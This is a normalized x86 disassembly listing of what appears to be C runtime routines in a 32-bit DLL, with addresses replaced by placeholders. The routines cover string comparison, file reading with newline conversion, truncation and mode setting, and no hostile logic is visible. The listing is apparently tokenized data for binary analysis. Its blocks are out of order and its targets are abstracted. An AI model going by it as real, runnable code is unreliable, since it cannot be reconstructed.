movzx eax [ ecx + eax * 2 ]
and eax [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test eax eax
je r-xdata
sub_1000eb5d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_1000a215
push eax
call sub_1000b8e8
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
call sub_10009172
add eax 0x20
cmp esi eax
jne r-xdata
call sub_10009172
add eax 0x40
cmp esi eax
jne r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc eax
inc [ rw-data ]
test [ esi + 0xc ] 0x10c
jne r-xdata
push ebx
push edi
lea edi [ eax * 4 + rw-data ]
cmp [ edi ] 0x0
mov ebx 0x1000
jne r-xdata
mov edi [ edi ]
mov [ esi + 0x8 ] edi
mov [ esi ] edi
mov [ esi + 0x18 ] ebx
mov [ esi + 0x4 ] ebx
push ebx
call sub_1000aaa8
pop ecx
mov [ edi ] eax
test eax eax
jne r-xdata
pop esi
pop ebp
retn
lea eax [ esi + 0x14 ]
push 0x2
mov [ esi + 0x8 ] eax
mov [ esi ] eax
pop eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x4 ] eax
jmp r-xdata
or [ esi + 0xc ] 0x1102
xor eax eax
pop edi
inc eax
pop ebx
jmp r-xdata
sub_1000ebf9
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push esi
mov esi [ ebp + 0xc ]
test [ esi + 0xc ] 0x1000
je r-xdata
pop esi
push esi
call sub_1000a23b
and [ esi + 0xc ] 0xffffeeff
and [ esi + 0x18 ] 0x0
and [ esi ] 0x0
and [ esi + 0x8 ] 0x0
pop ecx
sub_1000ec2d
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax 0xffff
cmp [ ebp + 0x8 ] ax
jne r-xdata
mov eax 0x100
cmp [ ebp + 0x8 ] ax
jae r-xdata
xor eax eax
leave
retn
lea eax [ ebp - 0x4 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push 0x1
call [ GetStringTypeW@IAT ]
test eax eax
jne r-xdata
movzx eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
jmp r-xdata
movzx eax [ ebp - 0x4 ]
and [ ebp - 0x4 ] eax
movzx ecx [ ebp + 0xc ]
and eax ecx
leave
retn
sub_1000ec82
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0xc ]
push esi
push edi
mov [ ebp - 0x1c ] eax
call sub_100087af
and [ ebp - 0x14 ] 0x0
cmp [ rw-data ] 0x0
mov [ ebp - 0x18 ] eax
jne r-xdata
mov eax [ rw-data ]
mov ecx [ ebp - 0x18 ]
mov esi [ DecodePointer@IAT ]
cmp eax ecx
je r-xdata
push r--data
call [ LoadLibraryW@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ rw-data ]
cmp eax [ ebp - 0x18 ]
je r-xdata
cmp [ rw-data ] ecx
je r-xdata
xor eax eax
mov edi [ GetProcAddress@IAT ]
push r--data
push ebx
call edi
test eax eax
je r-xdata
push [ rw-data ]
call esi
test eax eax
je r-xdata
push eax
call esi
test eax eax
je r-xdata
push eax
call esi
push [ rw-data ]
mov edi eax
call esi
mov ebx eax
test edi edi
je r-xdata
mov esi [ EncodePointer@IAT ]
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
mov [ rw-data ] eax
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
push [ ebp - 0x14 ]
call eax
jmp r-xdata
call eax
mov [ ebp - 0x14 ] eax
test eax eax
je r-xdata
test ebx ebx
je r-xdata
push r--data
push ebx
call edi
push eax
call esi
mov [ rw-data ] eax
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10008edb
leave
retn
mov eax [ rw-data ]
cmp eax [ ebp - 0x18 ]
je r-xdata
call edi
test eax eax
je r-xdata
push eax
call esi
test eax eax
je r-xdata
or [ ebp + 0x10 ] 0x200000
jmp r-xdata
lea ecx [ ebp - 0x24 ]
push ecx
push 0xc
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
push eax
call ebx
test eax eax
je r-xdata
push [ ebp - 0x14 ]
call eax
mov [ ebp - 0x14 ] eax
test [ ebp - 0x8 ] 0x1
jne r-xdata
sub_1000edee
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
je r-xdata
call sub_10007892
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
mov edx esi
xor eax eax
mov [ esi ] ax
jmp r-xdata
test edi edi
je r-xdata
add edx 0x2
dec edi
jne r-xdata
sub edx ecx
cmp [ edx ] 0x0
je r-xdata
xor eax eax
test edi edi
jne r-xdata
dec edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_10007892
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
movzx eax [ ecx ]
mov [ edx + ecx ] ax
add ecx 0x2
test ax ax
je r-xdata
call sub_10007840
mov eax esi
sub_1000ee63
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
push edi
test ebx ebx
jne r-xdata
test edx edx
je r-xdata
test edx edx
jne r-xdata
call sub_10007892
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
cmp [ ebp + 0xc ] edx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
test ebx ebx
jne r-xdata
xor eax eax
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
xor eax eax
mov [ edx ] ax
jmp r-xdata
mov eax edx
cmp ebx 0xffffffff
jne r-xdata
xor eax eax
mov [ edx ] ax
jmp r-xdata
mov esi ecx
sub esi edx
mov esi edx
sub esi ecx
test ebx ebx
jne r-xdata
dec edi
je r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor ecx ecx
mov [ eax ] cx
dec ebx
jne r-xdata
xor eax eax
cmp ebx 0xffffffff
jne r-xdata
movzx eax [ ecx ]
mov [ esi + ecx ] ax
add ecx 0x2
test ax ax
je r-xdata
jmp r-xdata
movzx ecx [ esi + eax ]
mov [ eax ] cx
add eax 0x2
test cx cx
je r-xdata
mov [ edx ] ax
call sub_10007892
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov ecx [ ebp + 0xc ]
push 0x50
mov [ edx + ecx * 2 - 0x2 ] ax
pop eax
jmp r-xdata
call sub_10007840
mov eax esi
jmp r-xdata
sub_1000ef30
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
js r-xdata
call sub_10007892
mov [ eax ] 0x16
call sub_10007840
or eax 0xffffffff
pop ebp
retn
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
pop ebp
retn
cmp ecx 0x3
jne r-xdata
mov eax [ rw-data ]
pop ebp
retn
sub_1000ef6f
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
movzx ecx [ edx ]
lea edi [ ecx - 0x41 ]
inc edx
cmp edi 0x19
ja r-xdata
add eax 0x20
test eax eax
je r-xdata
add ecx 0x20
pop edi
sub eax ecx
pop esi
pop ebp
retn
cmp eax ecx
je r-xdata
movzx eax [ esi ]
lea ecx [ eax - 0x41 ]
inc esi
cmp ecx 0x19
ja r-xdata
sub_1000efa8
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_100056cc
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
call sub_10007892
mov [ eax ] 0x16
call sub_10007840
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
call sub_10007892
mov [ eax ] 0x16
call sub_10007840
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub ebx esi
push edi
push esi
push ebx
call sub_1000ef6f
pop ecx
pop ecx
jmp r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
sub edi eax
mov eax edi
pop edi
cmp edi eax
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
movzx eax [ ebx + esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_1001060c
mov edi eax
movzx eax [ esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_1001060c
add esp 0x10
inc esi
test edi edi
je r-xdata
sub_1000f068
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ rw-data ] eax
jne r-xdata
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000efa8
add esp 0xc
pop ebp
retn
cmp [ ebp + 0x8 ] eax
jne r-xdata
cmp [ ebp + 0xc ] eax
je r-xdata
call sub_10007892
mov [ eax ] 0x16
call sub_10007840
mov eax 0x7fffffff
pop ebp
retn
pop ebp
jmp sub_1000ef6f
sub_1000f0af
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
cmp [ ebp + 0x10 ] 0x0
push ebx
push esi
push edi
je r-xdata
xor eax eax
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_100056cc
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
call sub_10007892
mov [ eax ] 0x16
call sub_10007840
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edi 0x7fffffff
cmp [ ebp + 0x10 ] edi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
call sub_10007892
mov [ eax ] 0x16
call sub_10007840
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub ebx esi
push [ ebp + 0x10 ]
push esi
push ebx
call sub_10010750
add esp 0xc
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub edi eax
mov eax edi
jmp r-xdata
test edi edi
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp edi eax
je r-xdata
movzx eax [ ebx + esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_1001060c
mov edi eax
movzx eax [ esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_1001060c
add esp 0x10
inc esi
dec [ ebp + 0x10 ]
je r-xdata
sub_1000f191
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ rw-data ] eax
jne r-xdata
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000f0af
add esp 0x10
pop ebp
retn
cmp [ ebp + 0x8 ] eax
jne r-xdata
cmp [ ebp + 0xc ] eax
je r-xdata
call sub_10007892
mov [ eax ] 0x16
call sub_10007840
mov eax 0x7fffffff
pop ebp
retn
cmp [ ebp + 0x10 ] 0x7fffffff
ja r-xdata
pop ebp
jmp sub_10010750
sub_1000f1e4
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
xor ebx ebx
push 0x1
push ebx
push ebx
push [ ebp + 0x8 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
call sub_1000b730
mov [ ebp - 0x18 ] eax
and eax edx
add esp 0x10
mov [ ebp - 0x14 ] edx
cmp eax 0xffffffff
je r-xdata
call sub_10007892
mov eax [ eax ]
push 0x2
push ebx
push ebx
push [ ebp + 0x8 ]
call sub_1000b730
mov ecx eax
and ecx edx
add esp 0x10
cmp ecx 0xffffffff
je r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x10 ]
sub esi eax
sbb edi edx
js r-xdata
cmp edi ebx
jg r-xdata
jg r-xdata
push ebx
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
push [ ebp + 0x8 ]
call sub_1000b730
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
jl r-xdata
mov ebx 0x1000
push ebx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
cmp esi ebx
jbe r-xdata
xor eax eax
jmp r-xdata
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000b730
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
cmp esi ebx
jae r-xdata
push 0x8000
push [ ebp + 0x8 ]
call sub_1000f9c6
pop ecx
pop ecx
mov [ ebp - 0x8 ] eax
call sub_10007892
mov [ eax ] 0xc
pop edi
pop esi
pop ebx
leave
retn
push [ ebp + 0x8 ]
call sub_1000d9d0
pop ecx
push eax
call [ SetEndOfFile@IAT ]
neg eax
sbb eax eax
neg eax
dec eax
cdq
mov [ ebp - 0x10 ] eax
and eax edx
mov [ ebp - 0xc ] edx
cmp eax 0xffffffff
jne r-xdata
mov eax esi
jg r-xdata
call sub_10007892
mov [ eax ] 0xd
call sub_100078a5
mov esi eax
call [ GetLastError@IAT ]
mov [ esi ] eax
mov esi [ ebp - 0x10 ]
call sub_100078a5
cmp [ eax ] 0x5
jne r-xdata
cdq
sub esi eax
sbb edi edx
js r-xdata
mov eax ebx
jmp r-xdata
cmp esi ebx
jb r-xdata
or esi 0xffffffff
mov [ ebp - 0xc ] esi
jmp r-xdata
call sub_10007892
mov [ eax ] 0xd
mov esi [ ebp - 0x10 ]
jg r-xdata
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_10009a44
add esp 0xc
cmp eax 0xffffffff
je r-xdata
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call sub_1000f9c6
pop ecx
pop ecx
push [ ebp - 0x4 ]
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
xor ebx ebx
jmp r-xdata
and esi [ ebp - 0xc ]
cmp esi 0xffffffff
je r-xdata
test edi edi
jl r-xdata
test esi esi
jne r-xdata
sub_1000f39a
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
mov edx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
push 0xfffffffe
pop eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x1c ] edx
cmp esi eax
jne r-xdata
push ebx
xor ebx ebx
cmp esi ebx
jl r-xdata
call sub_100078a5
and [ eax ] 0x0
call sub_10007892
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
call sub_100078a5
mov [ eax ] ebx
call sub_10007892
mov [ eax ] 0x9
call sub_10007840
or eax 0xffffffff
jmp r-xdata
cmp esi [ rw-data ]
jb r-xdata
pop esi
leave
retn
pop ebx
mov eax esi
sar eax 0x5
push edi
and esi 0x1f
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
shl esi 0x6
mov cl [ eax + esi + 0x4 ]
test cl 0x1
jne r-xdata
cmp edx 0x7fffffff
ja r-xdata
call sub_100078a5
mov [ eax ] ebx
call sub_10007892
mov [ eax ] 0x9
jmp r-xdata
call sub_100078a5
mov [ eax ] ebx
call sub_10007892
mov [ eax ] 0x16
mov [ ebp - 0xc ] ebx
cmp edx ebx
je r-xdata
call sub_10007840
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
test cl 0x2
jne r-xdata
pop edi
cmp [ ebp + 0xc ] ebx
je r-xdata
mov al [ eax + esi + 0x24 ]
add al al
sar al 0x1
mov [ ebp - 0x2 ] al
movsx eax al
dec eax
push 0x4
pop ecx
je r-xdata
mov eax edx
not eax
test al 0x1
jne r-xdata
dec eax
jne r-xdata
mov eax edx
shr eax 0x1
mov [ ebp + 0x10 ] ecx
cmp eax ecx
jb r-xdata
mov ebx [ ebp + 0xc ]
mov [ ebp - 0x10 ] ebx
jmp r-xdata
mov eax edx
not eax
test al 0x1
je r-xdata
push [ ebp + 0x10 ]
call sub_1000aaa8
mov ebx eax
pop ecx
mov [ ebp - 0x10 ] ebx
test ebx ebx
jne r-xdata
mov [ ebp + 0x10 ] eax
mov ecx [ edi ]
add ecx esi
test [ ecx + 0x4 ] 0x48
mov eax ebx
je r-xdata
and edx 0xfffffffe
mov [ ebp + 0x10 ] edx
push 0x1
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_1000b730
mov ecx [ edi ]
mov [ esi + ecx + 0x28 ] eax
add esp 0x10
mov [ esi + ecx + 0x2c ] edx
call sub_10007892
mov [ eax ] 0xc
call sub_100078a5
mov [ eax ] 0x8
push 0x0
lea ecx [ ebp - 0x18 ]
push ecx
push [ ebp + 0x10 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov cl [ ecx + 0x5 ]
cmp cl 0xa
je r-xdata
call [ GetLastError@IAT ]
push 0x5
pop esi
cmp eax esi
jne r-xdata
mov ecx [ ebp - 0x18 ]
test ecx ecx
js r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp eax 0x6d
jne r-xdata
call sub_10007892
mov [ eax ] 0x9
call sub_100078a5
mov [ eax ] esi
jmp r-xdata
cmp ecx [ ebp + 0x10 ]
ja r-xdata
dec [ ebp + 0x10 ]
cmp [ ebp - 0x2 ] 0x0
mov [ ebx ] cl
mov ecx [ edi ]
lea eax [ ebx + 0x1 ]
mov [ ebp - 0xc ] 0x1
mov [ esi + ecx + 0x5 ] 0xa
je r-xdata
push eax
call sub_100078b8
pop ecx
and [ ebp - 0x14 ] 0x0
jmp r-xdata
or [ ebp - 0x14 ] 0xffffffff
mov eax [ edi ]
add [ ebp - 0xc ] ecx
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x80
je r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x25 ]
cmp cl 0xa
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax 0xfffffffe
jne r-xdata
push eax
call sub_100079a5
pop ecx
mov eax [ ebp - 0x10 ]
cmp eax [ ebp + 0xc ]
je r-xdata
cmp [ ebp - 0x2 ] 0x2
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
jmp r-xdata
test ecx ecx
je r-xdata
test ecx ecx
je r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0xc ] 0x2
mov [ esi + ecx + 0x25 ] 0xa
jne r-xdata
and [ eax ] 0xfb
cmp [ ebx ] 0xa
jne r-xdata
and [ eax ] 0xfb
cmp [ ebx ] 0xa
jne r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x26 ]
cmp cl 0xa
je r-xdata
sub ebx [ ebp - 0x10 ]
mov [ ebp - 0xc ] ebx
jmp r-xdata
mov eax [ ebp + 0x10 ]
movzx ecx [ eax ]
cmp ecx 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
mov eax ebx
sub eax [ ebp - 0x10 ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0xc ] eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ecx ]
cmp al 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov ecx [ edi ]
lea esi [ esi + ecx + 0x4 ]
test [ esi ] 0x40
jne r-xdata
cmp ecx 0xd
je r-xdata
mov ebx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0xc ] eax
cmp ebx eax
jae r-xdata
test eax eax
je r-xdata
mov eax [ edi ]
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x40
jne r-xdata
cmp al 0xd
je r-xdata
mov ebx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0xc ] eax
cmp ebx eax
jae r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
mov [ ebp - 0xc ] 0x3
mov [ esi + ecx + 0x26 ] 0xa
mov ax [ eax ]
mov [ ebx ] ax
add ebx 0x2
or [ esi ] 0x2
jmp r-xdata
mov ecx [ ebp - 0xc ]
add ecx 0xfffffffe
cmp eax ecx
jae r-xdata
mov [ ebx ] cx
add ebx 0x2
add eax 0x2
mov [ ebp + 0x10 ] eax
jmp r-xdata
dec ebx
mov cl [ ebx ]
test cl cl
js r-xdata
mov al [ ecx ]
mov [ ebx ] al
inc ebx
or [ eax ] 0x2
jmp r-xdata
mov eax [ ebp - 0xc ]
dec eax
cmp ecx eax
jae r-xdata
mov [ ebx ] al
inc ebx
inc ecx
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add [ ebp + 0x10 ] 0x2
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x2
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea ecx [ eax + 0x2 ]
cmp [ ecx ] 0xa
jne r-xdata
mov eax [ ebp - 0xc ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
xor eax eax
inc eax
movzx ecx cl
jmp r-xdata
inc ebx
jmp r-xdata
inc [ ebp + 0x10 ]
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x1
lea eax [ ebp - 0x1 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea eax [ ecx + 0x1 ]
cmp [ eax ] 0xa
jne r-xdata
mov eax [ ebp - 0xc ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add eax 0x4
mov [ ebp + 0x10 ] eax
jmp r-xdata
cmp [ ecx + rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
sub ebx [ ebp - 0x10 ]
shr eax 0x1
push eax
push [ ebp + 0xc ]
push ebx
push [ ebp - 0x10 ]
push 0x0
push 0xfde9
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0xc ] eax
test eax eax
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] eax
jmp r-xdata
add ecx 0x2
mov [ ebp + 0x10 ] ecx
jmp r-xdata
push 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
pop eax
mov [ ebx ] ax
cmp eax 0x4
jg r-xdata
mov dl [ ebx ]
movzx ecx dl
movsx ecx [ ecx + rw-data ]
test ecx ecx
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ edi ]
xor ecx ecx
cmp eax ebx
setne cl
add eax eax
mov [ ebp - 0xc ] eax
mov [ esi + edx + 0x30 ] ecx
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebx ] 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
inc ebx
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp ebx [ ebp - 0x10 ]
jb r-xdata
inc ecx
cmp ecx eax
jne r-xdata
call sub_10007892
mov [ eax ] 0x2a
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
push 0x1
push 0xffffffff
push 0xfffffffe
push [ ebp + 0x8 ]
call sub_1000b730
add esp 0x10
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
push 0xa
jmp r-xdata
push 0xd
pop eax
mov [ ebx ] ax
mov eax [ edi ]
mov cl [ ebp - 0x8 ]
mov [ esi + eax + 0x5 ] cl
mov eax [ edi ]
mov cl [ ebp - 0x7 ]
mov [ esi + eax + 0x25 ] cl
mov eax [ edi ]
mov [ esi + eax + 0x26 ] 0xa
jmp r-xdata
dec ebx
movzx ecx [ ebx ]
inc eax
mov ecx [ edi ]
test [ ecx + esi + 0x4 ] 0x48
je r-xdata
add ebx eax
jmp r-xdata
push 0x1
push 0xffffffff
push 0xffffffff
push [ ebp + 0x8 ]
call sub_1000b730
add esp 0x10
cmp [ ebp - 0x1 ] 0xa
je r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
mov [ ebx ] 0xa
jmp r-xdata
mov [ ebx ] 0xd
mov eax [ edi ]
mov cl [ ebp - 0x1 ]
mov [ esi + eax + 0x5 ] cl
jmp r-xdata
add ebx 0x2
neg eax
cdq
push 0x1
push edx
push eax
push [ ebp + 0x8 ]
call sub_1000b730
add esp 0x10
inc ebx
mov [ ecx + esi + 0x5 ] dl
cmp eax 0x2
jl r-xdata
cmp eax 0x3
jne r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x25 ] dl
inc ebx
sub ebx eax
jmp r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x26 ] dl
inc ebx
sub_1000f951
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_1000d9d0
pop ecx
cmp eax 0xffffffff
jne r-xdata
push edi
push [ ebp + 0x10 ]
push 0x0
push [ ebp + 0xc ]
push eax
call [ SetFilePointer@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
call sub_10007892
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
pop esi
pop ebp
retn
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax edi
push eax
call sub_100078b8
pop ecx
or eax 0xffffffff
jmp r-xdata
test eax eax
je r-xdata
pop edi
sub_1000f9c6
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov eax esi
sar eax 0x5
lea edx [ eax * 4 + rw-data ]
mov ecx [ edx ]
and esi 0x1f
shl esi 0x6
add ecx esi
mov al [ ecx + 0x24 ]
add al al
push edi
movzx edi [ ecx + 0x4 ]
movsx eax al
and edi 0x80
sar eax 0x1
cmp ebx 0x4000
je r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
and [ ecx ] 0x80
cmp ebx 0x8000
je r-xdata
neg eax
sbb eax eax
and eax 0xc000
add eax 0x4000
pop ebp
retn
mov eax 0x8000
pop ebp
retn
and [ ecx + 0x4 ] 0x7f
jmp r-xdata
cmp ebx 0x10000
je r-xdata
test edi edi
pop edi
pop esi
pop ebx
jne r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
mov dl [ ecx ]
and dl 0x82
or dl 0x2
jmp r-xdata
cmp ebx 0x20000
je r-xdata
mov [ ecx ] dl
jmp r-xdata
cmp ebx 0x40000
jne r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
mov dl [ ecx ]
and dl 0x81
or dl 0x1
sub_1000fa81
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
pop ebp
retn
call sub_10007892
mov [ eax ] 0x16
call sub_10007840
push 0x16
pop eax
pop ebp
retn
sub_1000fae4
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_100056cc
mov esi [ ebp + 0x8 ]
movsx eax [ esi ]
push eax
call sub_10010721
cmp eax 0x65
jmp r-xdata
pop ecx
jne r-xdata
inc esi
movzx eax [ esi ]
push eax
call sub_10006182
test eax eax
movsx eax [ esi ]
push eax
call sub_10010721
pop ecx
cmp eax 0x78
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
mov al [ esi ]
mov cl [ ecx ]
mov [ esi ] cl
inc esi
add esi 0x2
mov cl [ esi ]
mov [ esi ] al
mov al cl
mov cl [ esi ]
inc esi
test cl cl
jne r-xdata
pop esi
